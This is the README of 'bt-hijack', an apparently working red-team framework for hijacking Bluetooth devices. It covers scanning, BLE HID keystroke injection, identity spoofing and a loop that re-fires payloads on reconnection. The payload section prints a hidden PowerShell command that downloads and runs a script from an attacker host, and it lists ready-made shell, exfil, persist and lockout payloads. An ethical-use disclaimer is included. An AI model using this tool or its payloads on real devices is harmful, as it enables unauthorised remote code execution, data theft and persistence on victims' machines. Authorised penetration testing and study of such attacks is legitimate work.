# bt-hijack

Red-team Bluetooth hijacking framework for **BR/EDR + BLE**, driven through the
host BlueZ stack from a plain Linux laptop. No extra USB dongles required for the
host-level attack paths.

> **Ethical use only.** This tool is for authorized penetration testing and red
> teaming against assets you own or have written permission to test. Unauthorized
> hijacking of Bluetooth devices is a crime in most jurisdictions.

## What it can do (as of now)

| Capability | Command | Status |
|---|---|---|
| Bluetooth discovery (LE + BR/EDR scan, RSSI, class) | `bthj scan` | working |
| Target profiling + attack suggestions | `bthj probe` | working |
| Controller / tooling diagnostics + engagement runbook | `bthj info`, `bthj doctor`, `bthj self-test` | working |
| Classic recon: RFCOMM channel sweep, **pure-Python SDP browse**, HIDP PSM 17/19 probe | `bthj rfcomm` | working |
| BLE HID keystroke injection (GATT keyboard gadget + pairing agent) | `bthj ble-hid` | working (live-tested on host) |
| Identity clone / spoofing (name + Device Class) | `bthj impersonate`, `bthj spoof` | working (class needs root) |
| Reconnect bait: re-fire payload on every re-association | `bthj impersonate --loop` | working |
| KNOB exploit / jamming / packet race | – | **stub** (needs Ubertooth/nRF radio) |
| Classic HID profile server (report over L2CAP PSM 17/19) | – | recon only (probe side live, profile server stubbed) |
| BD_ADDR cloning / silent reconnect via LTK | – | not possible on host BlueZ |

## Requirements

- Linux with a working **BlueZ** stack (`bluetoothd`, `bluetoothctl`; `btmgmt`
  for Device Class spoofing)
- Bluetooth adapter supporting **BR/EDR + BLE** (`/sys/class/bluetooth/hci0`)
- Python >= 3.10
- **root / CAP_NET_ADMIN** for `--class` spoofing and full discoverable/pairable
  control; run everything else as your normal user

## Install

```bash
python -m venv .venv
.venv/bin/pip install -e .
.venv/bin/bthj doctor      # preflight: root? controller? D-Bus? runbook
.venv/bin/bthj self-test
```

Dev tools:

```bash
.venv/bin/pip install -e ".[dev]"
.venv/bin/pytest -q
.venv/bin/ruff check bthj tests
```

## Quickstart (authorized engagement)

```bash
# 1. find a target
bthj scan --timeout 15

# 2. recon the Classic side: open RFCOMM channels + SDP services + HID PSMs
bthj rfcomm AA:BB:CC:DD:EE:FF

# 3. recommend a payload and fire it over BLE HID
bthj impersonate AA:BB:CC:DD:EE:FF \
  --script-file payloads/shell.txt \
  --var ATTACKER_IP=10.0.0.5 --var HTTP_PORT=8000 --out report.json

# keep firing on every re-association
bthj impersonate AA:BB:CC:DD:EE:FF --loop --max-fires 5 --script-file payloads/persist.txt
```

Every command that can fail still writes `--out report.json` (events timeline,
fires, channels, SDP/HID findings, error).

## Payload syntax

Ducky-ish, one step per line:

```
REM drop a PowerShell reverse shell
WIN r                     ; Win+R
DELAY 400
STRING powershell -nop -w hidden -c "IEX(IWR http://{{ATTACKER_IP}}/p.ps1)"
ENTER
```

- `STRING ...` types text; plain lines are treated as `STRING`
- `DELAY <ms>`, `ENTER`/`TAB`/`ESC`/`BACKSPACE`, modifiers (`WIN`, `CTRL`, `ALT`,
  `SHIFT`, combos like `CTRL ALT DELETE`)
- `REM` comments
- `{{TOKEN}}` placeholders substituted with `--var NAME=value` (repeatable);
  missing tokens are a hard error (exit code 2)

Ready-to-use payloads in `payloads/`: `demo`, `shell`, `beacon`, `exfil`,
`lockout`, `persist`, `syntax_example`.

## Interactive menu

Run `main.py` for a guided menu (no CLI arguments needed):

```bash
python main.py          # or ./main.py
```

The menu lets you:

1. Scan / probe / recon / inject / impersonate / spoof via interactive prompts
2. Add `{{TOKEN}}` variable substitutions when prompted
3. Run any `bthj` command directly by choosing option 9 and typing the argument string (e.g. `rfcomm AA:BB:CC:DD:EE:FF --channels 1-10`)

All input goes through the same `bthj.cli.main()` engine — results, `--out` reports, and exit codes work identically.

## Commands

| Command | Purpose |
|---|---|
| `scan` | discover devices (`--timeout`, `--passive`) |
| `probe <BD_ADDR>` | profile + ranked attack suggestions |
| `info` | controller capabilities |
| `spoof` | `--name`, `--class`, `--keyboard`, `--mouse` (class needs root) |
| `ble-hid` | BLE HID injection gadget (`--script`, `--script-file`, `--var`, `--loop`) |
| `impersonate` / `clone` | clone identity + fire payload (reconnect bait) |
| `rfcomm` / `sweep` ` <BD_ADDR>` | classic recon: channel sweep + SDP + HIDP PSMs |
| `self-test` | tooling + controller posture |
| `doctor` | readiness checks + runbook |

Common flags: `--json`, `--out REPORT.json`.

## Architecture

```
main.py       interactive menu frontend (prompts -> argv -> bthj.cli)
bthj/
  cli.py        argparse CLI + report pipeline (events, --out, timestamps)
  hal.py        backend ABC; SimBackend (offline) + get_backend()
  bluez_cli.py  BlueZ adapter (bluetoothctl/btmgmt parsing, scan, controller info)
  rfcomm.py     raw L2CAP RFCOMM sweep (SABM/DM/UA probe, channel timing)
  hid_classic.py pure-Python SDP client + HIDP PSM 17/19 probe
  hid_ble.py    BLE HID GATT gadget + Ducky payload engine
  impersonate.py identity probe/clone + multishot bait loop
  spoof.py      name/class constants + backends
  profiler.py   attack scoring
  payloads.py   token loader/substitution
```

At runtime the tool shells out to `bluetoothctl`/`btmgmt` for adapter control and
speaks raw L2CAP (RFCOMM/SDP/HIDP) itself, so it works on hosts that only ship a
minimal BlueZ (no `sdptool`, `hcitool`, `rfcomm` utilities).

## Limitations

- Silent auto-reconnect steal requires the victim's **LTK/link key** — not
  achievable from a host BlueZ stack. The tool instead models a multishot bait
  loop.
- BD_ADDR cloning, KNOB, and RF jamming need dedicated radio hardware.
- `spoof --class` requires root; `btmgmt` syntax is `class <major> <minor>`.